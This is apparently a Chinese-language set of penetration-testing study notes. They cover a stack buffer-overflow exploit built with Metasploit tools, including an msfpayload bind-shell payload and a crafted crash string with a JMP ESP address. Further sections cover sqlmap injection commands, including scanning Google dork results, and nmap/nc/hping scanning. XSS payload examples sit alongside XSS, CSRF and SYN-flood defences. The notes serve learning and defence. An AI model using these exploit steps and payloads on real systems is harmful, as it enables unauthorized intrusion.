<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 唯一字符串生成</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/tools</span><br><span class="line">./pattern_create.rb 4379 <span class="comment"># 长度为 4379</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 精确匹配偏移量</span></span><br><span class="line">./pattern_offset.rb 72712791</span><br><span class="line"><span class="comment"># 返回 offset 4368, 表示 4369 - 4372 这4个被覆盖</span></span><br></pre></td></tr></table></figure>

<p>构造攻击字符串：</p>
<ul>
<li>一般情况下，C 部分（ESP）用来构造Shell Code。</li>
<li>如果不行，则先进入 C 部分，再跳转到 A 部分，执行Shell Code。<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#         A               B          C</span></span><br><span class="line">crash = <span class="string">&#x27;\x41&#x27;</span> * <span class="number">4368</span> + <span class="string">&#x27;\x42&#x27;</span> * <span class="number">7</span> + <span class="string">&#x27;\x43&#x27;</span> * <span class="number">7</span></span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 汇编指令</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/tools</span><br><span class="line">./nasm_shell.rb</span><br><span class="line"><span class="comment"># 当函数返回时，返回地址已被修改，新的地址被读入EIP中，函数返回值存放在EAX中</span></span><br><span class="line"><span class="comment"># 这个函数的返回值就是 crash 字符串</span></span><br><span class="line">&gt; add eax, 12</span><br><span class="line">&gt; jmp eax</span><br><span class="line"><span class="comment"># 返回 83 c0 0c ff e0 90 90 </span></span><br></pre></td></tr></table></figure>

<p>使用<code>EDB</code>插件<code>Opcode Search</code>搜索<code>ESP-&gt;EIP</code>得到<code>JMP ESP</code>指令的地址(0x08134587)。</p>
<p>查找坏字符：不能出现在Shell Code中</p>
<ol>
<li>**</li>
</ol>
<p>编写Shell Code</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -b 坏字符表</span></span><br><span class="line">msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | msfencode - b <span class="string">&quot;\x00\x20\x09\x0D&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crash = shell_code + <span class="string">&#x27;\x41&#x27;</span> * (<span class="number">4368</span> - <span class="built_in">len</span>(shell_code)) </span><br><span class="line">      + <span class="string">&#x27;\x87\x45\x13\x08&#x27;</span> </span><br><span class="line">      + <span class="string">&#x27;\x83\xc0\x0c\xff\xe0\x90\x90&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>重要的头：</p>
<ul>
<li>Set-Cookie - 发送给客户端 SessionId</li>
<li>Content-Length - 响应体的字节长度</li>
<li>Location - 重定向到另一个页面，用于识别身份后跳转</li>
<li>Cookie </li>
<li>Referer - 发起请求之前，用户位于哪个页面</li>
<li>Host - 发起请求之前，用户位于的站点</li>
</ul>
<h3 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h3><p>Httrack：用于克隆目标网站，以减少与目标系统的交互。克隆之后，搜索敏感的字符串：电话，邮件等。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httrack</span><br></pre></td></tr></table></figure>

<p>hidemyass：免费HTTP代理，可能会有黑客。</p>
<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><ul>
<li>Nikto</li>
<li>Vega</li>
<li>Skipfish</li>
<li>W3af</li>
<li>Arachni</li>
<li>Owasp-zap</li>
</ul>
<p>Nikto：可以扫描</p>
<ul>
<li>Web服务器版本</li>
<li>存在安全隐患的文件</li>
<li>服务器配置漏洞</li>
<li>Web 应用程序上的安全隐患</li>
</ul>
<p>同时会扫描所有页面。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nikto -update  <span class="comment"># 升级数据库</span></span><br><span class="line">nikto -list-plugin <span class="comment"># 插件</span></span><br></pre></td></tr></table></figure>

<h3 id="手动挖洞"><a href="#手动挖洞" class="headerlink" title="手动挖洞"></a>手动挖洞</h3><h2 id="默认开通某些服务，可能被攻击：-phpMyAdmin-setup-Ubuntu-默认安装-PHP5-cgi"><a href="#默认开通某些服务，可能被攻击：-phpMyAdmin-setup-Ubuntu-默认安装-PHP5-cgi" class="headerlink" title="默认开通某些服务，可能被攻击：- phpMyAdmin&#x2F;setup- Ubuntu 默认安装 PHP5-cgi"></a>默认开通某些服务，可能被攻击：<br>- phpMyAdmin&#x2F;setup<br>- Ubuntu 默认安装 PHP5-cgi</h2><h3 id="SQL-自动注入"><a href="#SQL-自动注入" class="headerlink" title="SQL 自动注入"></a>SQL 自动注入</h3><p>SQLMap：</p>
<p>不仅可以发现SQL漏洞，还能检查跨站脚本漏洞。</p>
<p>五种检测技术</p>
<ul>
<li>基于布尔的盲注</li>
<li>基于时间的盲注</li>
<li>基于错误的检测</li>
<li>基于Union的检测：适用于循环</li>
<li>基于堆叠查询的检测</li>
</ul>
<p>GET 注入：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -u url   -p 检测的参数   -f 检查服务器指纹信息</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://...&quot;</span> -p username -f  </span><br><span class="line"><span class="comment"># --users  管理员账号</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://...&quot;</span> -p username --<span class="built_in">users</span></span><br><span class="line"><span class="comment"># --banner Banner信息  </span></span><br><span class="line"><span class="comment"># --dbs 查询所有的库</span></span><br><span class="line"><span class="comment"># --schema 元数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -a 所有信息</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://...&quot;</span> -p username -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># -m 检查URL List</span></span><br><span class="line">sqlmap -m url_list.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># -g 扫描 Google 搜索结果</span></span><br><span class="line">sqlmap -g <span class="string">&quot;inurl:\&quot;.php?id=1\&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>POST 注入：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 burpsuit 作为代理，用浏览器连接代理，准备抓包</span></span><br><span class="line"><span class="comment"># 抓取HTTP请求，保存到 request.txt </span></span><br><span class="line">sqlmap -r request.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 burpsuit 作为代理，用浏览器连接代理，准备抓包</span></span><br><span class="line"><span class="comment"># 在 burpsuit 中配置 Options，Logging 中勾选 Proxy Requests</span></span><br><span class="line"><span class="comment"># 结果保存到 用户目录下 log.txt</span></span><br><span class="line">sqlmap -l log.txt</span><br></pre></td></tr></table></figure>

<p>可以直接连接数据库，其他查询方式一样：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d <span class="string">&quot;mysql://root@xx.xx.xx.xx:3306/database_name&quot;</span> -f --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>

<p>Request：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>


<p>其他功能：</p>
<ul>
<li>可以进行字典破解，来破解密码。</li>
</ul>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="TurnKey"><a href="#TurnKey" class="headerlink" title="TurnKey"></a>TurnKey</h3><p><a target="_blank" rel="noopener" href="https://www.turnkeylinux.org/">地址</a><br>有各种应用构成的虚拟机可供测试。</p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p><a target="_blank" rel="noopener" href="https://www.metasploit.com/">Metasploit</a><br><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/metasploitable/">Metasploitable 2</a><br>集成各种渗透测试应用。</p>
<p>Metasploitable 2 中需要配置一下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /var/www/mutillidae/config.inc</span><br><span class="line"><span class="comment"># 修改 dbname</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;owasp10&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Vulhub"><a href="#Vulhub" class="headerlink" title="Vulhub"></a>Vulhub</h3><p><a target="_blank" rel="noopener" href="https://vulhub.org/">地址</a><br>基于docker和docker-compose的漏洞环境集合。</p>
<h3 id="模拟防火墙"><a href="#模拟防火墙" class="headerlink" title="模拟防火墙"></a>模拟防火墙</h3><p><a target="_blank" rel="noopener" href="http://m0n0.ch/wall/downloads.php">地址</a><br>用于模拟真实网络。</p>
<h1 id="Linux-扫描与防御"><a href="#Linux-扫描与防御" class="headerlink" title="Linux 扫描与防御"></a>Linux 扫描与防御</h1><h2 id="主机扫描-1"><a href="#主机扫描-1" class="headerlink" title="主机扫描"></a>主机扫描</h2><h3 id="netstat-查看端口"><a href="#netstat-查看端口" class="headerlink" title="netstat 查看端口"></a>netstat 查看端口</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l <span class="comment"># 正在监听的端口</span></span><br><span class="line">-t <span class="comment"># TCP 协议</span></span><br><span class="line">-n <span class="comment"># 不解析主机名</span></span><br></pre></td></tr></table></figure>

<h3 id="禁用-ICMP-连接"><a href="#禁用-ICMP-连接" class="headerlink" title="禁用 ICMP 连接"></a>禁用 ICMP 连接</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>

<h3 id="TCP-Dump"><a href="#TCP-Dump" class="headerlink" title="TCP Dump"></a>TCP Dump</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -np -ieth0</span><br></pre></td></tr></table></figure>

<h3 id="fping-批量主机扫描工具（ICMP）"><a href="#fping-批量主机扫描工具（ICMP）" class="headerlink" title="fping 批量主机扫描工具（ICMP）"></a>fping 批量主机扫描工具（ICMP）</h3><p>作用：批量，并行发送，结果易懂。<br><a target="_blank" rel="noopener" href="http://fping.org/">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">man fping <span class="comment"># 查看帮助</span></span><br><span class="line">fping IP1 IP2</span><br><span class="line">-a <span class="comment"># 只显示存活的主机</span></span><br><span class="line">-u <span class="comment"># 只显示未存活的主机</span></span><br><span class="line">-g <span class="comment"># 主机段 </span></span><br><span class="line">-f <span class="comment"># 从文件读取</span></span><br></pre></td></tr></table></figure>

<h3 id="hping-批量主机扫描工具（TCP-IP）"><a href="#hping-批量主机扫描工具（TCP-IP）" class="headerlink" title="hping 批量主机扫描工具（TCP&#x2F;IP）"></a>hping 批量主机扫描工具（TCP&#x2F;IP）</h3><p>作用：探测TCP端口，模拟DDOS攻击。<br><a target="_blank" rel="noopener" href="http://www.hping.org/">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hping -h <span class="comment"># 帮助</span></span><br><span class="line">-p port_num <span class="comment"># 端口探测</span></span><br><span class="line">-S <span class="comment"># 设置TCP模式下的 SYN 包</span></span><br><span class="line">-a <span class="comment"># 伪造IP地址</span></span><br></pre></td></tr></table></figure>

<h2 id="路由扫描"><a href="#路由扫描" class="headerlink" title="路由扫描"></a>路由扫描</h2><h3 id="Trace-Route"><a href="#Trace-Route" class="headerlink" title="Trace Route"></a>Trace Route</h3><p>让每一个路由返回一个ICMP包。</p>
<ul>
<li>Windows：发送 ICMP 包。</li>
<li>Linux：发送 UDP 包，端口号大于30000。</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">traceroute IP <span class="comment"># 默认 UDP</span></span><br><span class="line">-T <span class="comment"># 使用 TCP</span></span><br><span class="line">-p <span class="comment"># 使用 TCP 的端口号</span></span><br><span class="line">-I <span class="comment"># 使用 ICMP</span></span><br><span class="line">-n <span class="comment"># 延时时间</span></span><br></pre></td></tr></table></figure>

<h3 id="MTR"><a href="#MTR" class="headerlink" title="MTR"></a>MTR</h3><p>测试主机到每一个路由的连通性，实时。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtr IP</span><br></pre></td></tr></table></figure>

<h2 id="扫描服务"><a href="#扫描服务" class="headerlink" title="扫描服务"></a>扫描服务</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p>批量扫描主机和服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-P   <span class="comment"># ICMP ping 简单</span></span><br><span class="line">-sS  <span class="comment"># TCP SYN   不易检测，通用</span></span><br><span class="line">-sT  <span class="comment"># TCP 连接  真实</span></span><br><span class="line">-sU  <span class="comment"># UDP       可能穿透防火墙，会很慢：Linux限制单位时间内返回ICMP的次数</span></span><br><span class="line"></span><br><span class="line">nmap -sP 10.10.10.0/24 <span class="comment"># 得到存活的主机</span></span><br><span class="line">nmap -sS 10.10.10.12   <span class="comment"># 得到主机上存活的TCP服务（默认0-1024和特殊端口）</span></span><br><span class="line">nmap -sS -p 0-30000 10.10.10.12 <span class="comment"># 指定端口 </span></span><br></pre></td></tr></table></figure>

<h3 id="NCAT-1"><a href="#NCAT-1" class="headerlink" title="NCAT"></a>NCAT</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-w <span class="comment"># 超时时间</span></span><br><span class="line">-z <span class="comment"># 输入输出模式</span></span><br><span class="line">-v <span class="comment"># 显示命令执行过程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认 TCP</span></span><br><span class="line">nc -v -z -w2 10.10.10.12 1-50 <span class="comment"># 端口范围1-50</span></span><br><span class="line"><span class="comment"># UDP</span></span><br><span class="line">nc -v -u -z -w2 10.10.10.12 1-50</span><br></pre></td></tr></table></figure>

<h2 id="攻击防御"><a href="#攻击防御" class="headerlink" title="攻击防御"></a>攻击防御</h2><p>攻击者伪造源IP，发送SYN包，耗尽目标机器资源。<br>防御方式：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方式1：设置重置次数，默认都是5次</span></span><br><span class="line">sysctl -w net.ipv4.tcp_synack_retries=3</span><br><span class="line">sysctl -w net.ipv4.tcp_syn_retries=3</span><br><span class="line"><span class="comment"># 方式2：设置SYN Cookies</span></span><br><span class="line">sysctl -w net.ipv4.tcp_syncookies=1</span><br><span class="line"><span class="comment"># 方式3：增大backlog队列（保存SYN请求的缓冲区）</span></span><br><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=2048</span><br></pre></td></tr></table></figure>

<p>关闭ICMP：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>

<p>设置IP Tables防止扫描。</p>
<h2 id="IP-Tables"><a href="#IP-Tables" class="headerlink" title="IP Tables"></a>IP Tables</h2><h1 id="内存包含机制"><a href="#内存包含机制" class="headerlink" title="内存包含机制"></a>内存包含机制</h1><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p>
<h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p>关闭方法：打开<code>Windows Defender</code>，<code>应用和浏览器控制</code>，<code>Exploit Protection</code>，先关闭<code>ASLR</code>，再关闭其余两项。之后重启。</p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Ubuntu 关闭方法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前配置</span></span><br><span class="line"><span class="comment"># 0 关闭 1 半随机 2 全随机（包含HEAP）</span></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space </span><br><span class="line"><span class="comment"># 查看地址空间随机效果</span></span><br><span class="line">ldd /bin/bash </span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时关闭 ASLR</span></span><br><span class="line">sysctl -w kernel.randomize_va_space=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 永久关闭 ASLR</span></span><br><span class="line">vim /etc/sysctl.conf</span><br><span class="line"><span class="comment"># 增加</span></span><br><span class="line">kernel.randomize_va_space=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># GDB 下关闭 ASLR</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization on   <span class="comment"># 关闭 ASLR</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization off  <span class="comment"># 开启 ASLR</span></span><br><span class="line">show disable-randomization     <span class="comment"># 查看</span></span><br></pre></td></tr></table></figure>

<h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="堆栈-Cookies"><a href="#堆栈-Cookies" class="headerlink" title="堆栈 Cookies"></a>堆栈 Cookies</h2><h2 id="堆栈粉碎"><a href="#堆栈粉碎" class="headerlink" title="堆栈粉碎"></a>堆栈粉碎</h2><h1 id="Web-漏洞"><a href="#Web-漏洞" class="headerlink" title="Web 漏洞"></a>Web 漏洞</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>跨站脚本攻击：通过在网站中提交含可执行代码的内容，被其他用户访问的时候执行。</p>
<p>类型包括：<br>反射型：URL带注入。可以用短网址隐藏。<br>存储型：存到数据库。其他用户访问时被攻击。</p>
<h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>HTML 结点内容：用户输入的动态信息。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>HTML 属性：由用户输入。<br>用户输入了 <code>1&quot; onerror=&quot;alert(1)</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>JavaScript 代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>富文本。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="拦截"><a href="#拦截" class="headerlink" title="拦截"></a>拦截</h3><p>设置Header：关闭可能的XSS攻击（浏览器自带功能）。只拦截反射型，且只拦截HTML内容和属性种的。：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">set</span>(<span class="string">&#x27;X-XSS-Protection&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>转义：将<code>&lt;, &gt;, &quot;, &#39;, ...</code>替换为HTML实体。可以在上传时替换，也可以在显示时替换。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&#x27;&amp;#32;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>同时转义Javascript内部的代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>);  <span class="comment">// 放在最前</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>);</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>Javascript内部的代码最保险的方法是使用Encode：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">JSON</span>.<span class="title function_">stringify</span>();</span><br></pre></td></tr></table></figure>

<p>富文本的过滤：富文本最复杂，使用黑名单和白名单。一般在输入时过滤。<br>黑名单方法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;script&gt;</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/&lt;\s*\/?script\s*/</span>&gt;);  </span><br><span class="line"><span class="comment">// &lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/javascript:[^&#x27;&quot;]*/</span>&gt;);</span><br><span class="line"><span class="comment">// &lt;img src=&quot;123&quot; onerror=&quot;alert(1)&quot;&gt;  </span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/onerror\s*=\s*/</span>&gt;);</span><br><span class="line"><span class="comment">// 其他形式 ...</span></span><br></pre></td></tr></table></figure>

<p>白名单方法：先解析HTML，再将必要的标签输出</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(HTML_To_Filt)</span><br><span class="line"><span class="keyword">var</span> white_list = &#123;</span><br><span class="line">    <span class="string">&#x27;img&#x27;</span>: [<span class="string">&#x27;src&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="string">&#x27;*&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index, elem</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!white_list[elem.<span class="property">name</span>])&#123;</span><br><span class="line">        $(elem).<span class="title function_">remove</span>();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> attr <span class="keyword">in</span> elem.<span class="property">attribs</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(white_list[elem.<span class="property">name</span>].<span class="title function_">indexOf</span>(attr) === -<span class="number">1</span>)&#123;</span><br><span class="line">            $(elem).<span class="title function_">attr</span>(attr, <span class="literal">null</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">$.<span class="title function_">html</span>()</span><br></pre></td></tr></table></figure>

<h3 id="XSS-拦截集成库"><a href="#XSS-拦截集成库" class="headerlink" title="XSS 拦截集成库"></a>XSS 拦截集成库</h3><p><a target="_blank" rel="noopener" href="https://github.com/leizongmin/js-xss.git">Github 地址</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xss = <span class="built_in">require</span>(<span class="string">&#x27;xss&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> html = <span class="title function_">xss</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="CSP-内容安全策略"><a href="#CSP-内容安全策略" class="headerlink" title="CSP 内容安全策略"></a>CSP 内容安全策略</h3><p>HTTP头，用于指定哪些可以执行。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27; http://www.com; content-src &#x27;none&#x27;; script-src http://www.com</span><br></pre></td></tr></table></figure>

<h2 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h2><p>用户打开某一个第三方网站，则第三方网站伪装成用户在某网站进行操作。甚至可以用来制造网络蠕虫。</p>
<p>攻击步骤：</p>
<ol>
<li>用户登录A网站</li>
<li>A网站确认身份</li>
<li>B网站前端向A网站发起请求，附带身份</li>
</ol>
<p>危害：</p>
<ul>
<li>冒用用户的身份</li>
<li>用户不知情</li>
<li>盗取用户资金</li>
</ul>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>禁止第三方网站前端带Cookies访问：</p>
